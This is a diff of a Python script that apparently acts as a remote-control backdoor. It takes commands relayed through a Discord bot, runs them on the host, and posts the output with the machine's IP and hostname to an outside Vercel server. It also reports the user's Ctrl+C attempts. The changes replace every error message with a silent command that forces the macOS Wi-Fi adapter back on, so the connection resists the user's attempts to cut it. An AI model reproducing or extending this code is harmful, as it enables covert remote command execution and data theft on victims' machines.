@@ -36,11 +36,11 @@ while True:
             try:
                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when handling discord api``")
             except KeyboardInterrupt:
-                print("Failed to connect to server")
+                system("/usr/sbin/networksetup -setairportpower en0 on")
                 continue
             continue
         except:
-            print("Failed to connect to server")
+            system("/usr/sbin/networksetup -setairportpower en0 on")
             sleep(3)
             continue
         # execute command
@@ -81,8 +81,9 @@ while True:
 #                    except KeyboardInterrupt:
 #                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when replying to ping``")
 #                    except:
-#                        print("Failed to connect to server")
-#                        continue
+                        system("/usr/sbin/networksetup -setairportpower en0 on")
+
+#                       continue
                 if command.startswith("cd"):
                     dir=command.replace('cd', '')
                     try:
@@ -96,7 +97,8 @@ while True:
                     except FileNotFoundError:
                         post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```No Such Directory```-{ip}@{hostname}")
                     except:
-                        print("Failed to connect to server")
+                        system("/usr/sbin/networksetup -setairportpower en0 on")
+
                         continue
                 old_command = command
                 if localcmd:
@@ -126,7 +128,8 @@ while True:
                             continue
                     continue
                 except:
-                    print("Failed to sent (error)output")
+                    system("/usr/sbin/networksetup -setairportpower en0 on")
+
                     continue
                 if cmdout.decode() != "" and cmderr.decode() == "":
                     try:
@@ -141,7 +144,8 @@ while True:
                                 continue
                         continue
                     except:
-                        print("Failed to sent output")
+                        system("/usr/sbin/networksetup -setairportpower en0 on")
+
                         continue
                 elif cmdout.decode() == "" and cmderr.decode() == "":
                     try:
@@ -153,7 +157,8 @@ while True:
                                 continue
                         continue
                     except:
-                        print("Failed to sent output")
+                        system("/usr/sbin/networksetup -setairportpower en0 on")
+
                         continue
                 old_command = command
                 continue
